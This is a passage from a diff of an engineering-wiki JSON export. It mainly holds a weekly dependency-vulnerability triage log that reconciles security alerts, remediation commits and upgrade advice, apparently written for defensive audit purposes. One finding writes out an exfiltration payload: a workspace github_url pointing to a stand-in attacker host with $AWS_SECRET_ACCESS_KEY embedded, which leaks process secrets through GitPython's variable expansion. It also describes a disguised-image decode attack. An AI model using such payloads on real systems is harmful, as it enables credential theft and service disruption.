path and the still-vulnerable installed versions (python-multipart 0.0.27 < 0.0.30, starlette 0.49.1 < 1.3.1). Note: the esbuild #653 row (GHSA-gv7w-rqvm-qjhr) references an alert that does not exist in the repo (API 404; no such advisory alert) — it was added in error and is not a tracked vulnerability.\nEverything else is non-material: Node-adapter/proxy code that never runs in a browser SPA (all axios), SSR/Framework-mode features we don't use (react-router), dev/build/test tooling on trusted input (minimatch, picomatch, eslint/storybook/vite chains, black, wheel, setuptools), unreachable APIs (GitPython config_writer, lodash _.template, glob CLI, DTLS, SECT curves, ecdsa signing), orphaned lockfile entries that aren't even installed (fast-uri, serialize-javascript), trusted-source-only inputs (renderer tar/FTP/ws, urllib3 to AWS, pyarrow streams), or already-patched versions with stale alerts (lxml). Recommended hygiene sweep: bump axios to ≥1.16, react-router-dom to ≥7.15, aws-amplify, GitPython to ≥3.1.50, orjson, urllib3, storybook, vite; remove dead deps (terser@3.14.1, react-cookie-consent, customize-cra chain); regenerate the frontend lockfile to drop orphaned webpack-era entries.\nJune 29, 2026 reconcile: Open set is now 5 critical / 104 high (down from 5 / 107 on June 24). The two material findings that were open last week — python-multipart #660 and starlette #662 (unauthenticated DoS via the public SAML ACS endpoint) — were remediated June 26, 2026 via commit efb43ffda4 (\"bump fastapi, starlette and python-multipart for critical vuln remediation\"); back_end poetry.lock now pins python-multipart 0.0.30, starlette 1.3.1, fastapi 0.133.1 (verified). The non-material starlette StaticFiles-UNC alert #656 closed in the same bump. No new critical or high alerts opened this week, and there are now 0 materially-exploitable open findings across both severities. git_store still runs the older vulnerable versions (python-multipart 0.0.17, starlette 0.46.2 → alerts #681/#683/#677/#601/#411/#407/#409 remain open) but it is internal-only (no public route), so those stay non-material. The esbuild #653 row remains a phantom (no such alert in the repo; tracked in error).\nJuly 6, 2026 reconcile: Open set unchanged since June 29 — 5 critical / 104 high, 0 materially exploitable. No new critical or high alerts opened and none closed this week. No dependency manifest/lockfile changed on dev since June 29, so all installed-version facts in the rows above still hold; re-verified back_end pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1 (the June 26 material-fix commit efb43ffda4). Spot-checked the week's code diff for verdict-relevant drift: git_store untouched; renderer change only makes its S3 bucket name env-configurable (still our own bucket); no new Form()/multipart endpoints, no new axios config patterns (create/interceptors/baseURL), no react-router loaders/actions/redirect(), no _.template usage introduced. Bookkeeping note: the axios rows above cite five package.json-manifest duplicate alerts (#652, #651, #645, #643, #641) that GitHub actually auto-closed June 10–12, 2026 — they are duplicates of still-open yarn.lock alerts for the same advisories, so the 24 remaining open axios alerts and the row verdicts are unaffected. The recommended hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, lockfile regeneration) remains the fastest way to burn down the non-material backlog.\"\nJuly 13, 2026 reconcile: Open set is 5 critical / 103 high, 0 materially exploitable. No new critical or high alerts opened, and no alerts actually closed — the API shows zero fixed/dismissed/auto-dismissed high alerts since June 29. The count change (104 → 103) is a bookkeeping correction only: axios dup alert #628, cited in the axios Node-adapter row, does not exist in the repo in any state (API 404 — a phantom reference like esbuild #653), so last week's 104 overcounted by one; the true open axios count is 23 alerts and no row verdicts change. No dependency manifest/lockfile changed on dev since July 6, so all installed-version facts above still hold (back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1; git_store still on its older internal-only versions). Spot-checked the week's code diff for verdict-relevant drift: no new Form()/multipart/request.form() endpoints, no GitPython config_writer/multi_options usage, no new axios config patterns (create/interceptors/baseURL/xsrfCookieName), no react-router loaders/actions/redirect(), no _.template, no window.vega/VEGA_DEBUG. The recommended hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding and is still the fastest way to burn down the non-material backlog.\nJuly 20, 2026 reconcile: Open set is 5 critical / 105 high, 0 materially exploitable. Two new high alerts opened this week, both frontend and both triaged non-material (rows added above): js-yaml #691 (quadratic merge-key DoS — direct runtime dep whose load() only ever parses the workspace's own data-model YAML; client-side availability-only) and brace-expansion #690 (exponential-expansion DoS — vulnerable 2.0.1 copy lives only under lint/build toolchains). No alerts closed or dismissed. No dependency lockfile changed on dev; re-verified back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1, and git_store its older internal-only versions (python-multipart 0.0.17, starlette 0.46.2, GitPython 3.1.45). Verdict-relevant drift: the MCP-server work (commit 71333df7f4) added a new public/unauthenticated POST /oauth/token endpoint with Form(...) params in back_end (api/v2/oauth/routes.py) — a new unauthenticated form-parsing surface, but the patched python-multipart/starlette pins already cover it, so no new material finding; git_store and renderer had zero commits; no new axios config patterns, react-router loaders/actions/redirect(), _.template, or window.vega/VEGA_DEBUG in the frontend diff; the public SAML ACS endpoint is unchanged. Scope note: 71333df7f4 also added a new manifest services/mcp_server/pyproject.toml (mcp[cli], httpx, no lockfile) — future sweeps must include this new service. Quick win: the one-line yarn upgrade js-yaml@^4.3.0 closes #691; the broader hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding.\nJuly 27, 2026 reconcile: Open set is 5 critical / 142 high, 2 materially exploitable — the first non-zero material count since the SAML-ACS findings were remediated June 26, 2026. 37 new high alerts opened this week (a large Pillow + GitPython advisory wave); none closed or dismissed. No dependency lockfile changed on dev since July 20, so all prior installed-version facts still hold (back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1; git_store still on its older internal-only versions).\nTwo new material findings (both remediation-worthy):\n- Pillow #704 (CVE-2026-59204, JPEG2000 tiled-decode DoS) — reachable via the same unrestricted Image.open(io.BytesIO(...)) on user-uploaded chat images (conversation_processor.py:831, no formats= restriction) that made #418/#530 material; a JP2 renamed .png passes the extension gate and forces a full decode server-side. Availability-only, authenticated. Fix: bump Pillow 12.2.0 → 12.3.0 (clears all 10 new Pillow alerts #694–#705).\n- GitPython #725 (back_end) + #724 (git_store) (GHSA-rwj8-pgh3-r573, env-var exfiltration) — Repo.clone_from() runs os.path.expandvars() on the clone URL, and customer-settable workspace.github_url reaches it unvalidated both in-process in back_end (metrics_layer/.../github_repo.py:212,222) and via git_store (main.py:1202,1211). A workspace admin (edit_settings) can set github_url = https://attacker.tld/$AWS_SECRET_ACCESS_KEY.git to leak backend/git-store process-env secrets (AWS creds, DB URL, encryption/LLM keys) to an attacker host — customer tenant → Zenlytic infra. Fix: bump both poetry.locks to ≥3.1.52 (≥3.1.55 clears the whole 9-alert GitPython wave); harden by validating github_url on write in ModifyWorkspaces.patch (workspace.py:1097-1103).\nStructural note: back_end is no longer GitPython-free — it clones customer repos in-process via the vendored metrics_layer GithubRepo, so back_end GitPython alerts (#716/720/723/725/727-731) can no longer be dismissed as dev/unused. This is a new manifest cluster.\nThe other 35 new alerts are non-material: the remaining 9 Pillow advisories (RankFilter/paste/crop/ImageCms/font/GD/McIdas/PDF decoders never reached on the backend path); the 8 other GitPython advisories in the wave (clone options hardcoded, refs git-validated, config_writer/create_remote unreached — thinnest margins are #728 diff --output and #730 single-char-kwarg smuggling); pyasn1 #707/#708 (transitive DoS, no untrusted ASN.1 decode); sharp #722 (only inside the network-blocked Modal code-interpreter microVM that already runs arbitrary LLM code unprivileged); react-router #735 (Framework/SSR-mode-only per the advisory; we run Data Mode client-only); postcss #732/#736 (dev/build tooling on repo-authored CSS); brace-expansion #692/#737 and fast-uri #714/#726 (folded into existing rows — lint/build toolchains, and an orphaned uninstalled lockfile entry, respectively). Both new material code paths were re-verified to exist as described.\nFastest burndown: Pillow → 12.3.0 and GitPython → ≥3.1.55 in both back_end and git_store poetry.locks resolve both material findings plus 17 non-material alerts in two lockfile bumps; the standing hygiene sweep (axios ≥1.16, react-router-dom ≥7.18, aws-amplify, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding.",
+      "keywords": [
+        "encryption",
+        "tls",
+        "audit",
+        "vulnerability",
+        "sso",
+        "saml",
+        "aws",
+        "network",
+        "vendor",
+        "api"
+      ],
+      "lastUpdated": "2026-08-02T03:03:22.452Z"
+    },
+    {
+      "id": "3a0a8dad-05ac-8058-8938-d5863d64095d",
+      "title": "2026 Q3 Hackathon ",
+      "parent": "Engineering Wiki",
+      "content": "",
+      "keywords": [],
+      "lastUpdated": "2026-08-02T03:03:23.114Z"
+    },
+    {
+      "id": "3a0a8dad-05ac-80fc-9b98-fc7ec82170de",
+      "title": "Subagent Performance",
+      "parent": "2026 Q3 Hackathon ",
+      "content": "Author: @Jennifer Hsu \nQuestion in Pure Organics: ",
+      "keywords": [],
+      "lastUpdated": "2026-08-02T03:03:23.452Z"
     },
     {
       "id": "129a8dad05ac801cb803e69297ecf8c7",
@@ -1193,7 +1327,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:34:56.982Z"
+      "lastUpdated": "2026-08-02T03:03:24.604Z"
     },
     {
       "id": "29ca8dad-05ac-80f3-9e55-cbb965b5b401",
@@ -1207,7 +1341,7 @@
         "rpo",
         "rto"
       ],
-      "lastUpdated": "2025-12-23T17:34:57.366Z"
+      "lastUpdated": "2026-08-02T03:03:25.103Z"
     }
   ]
 }
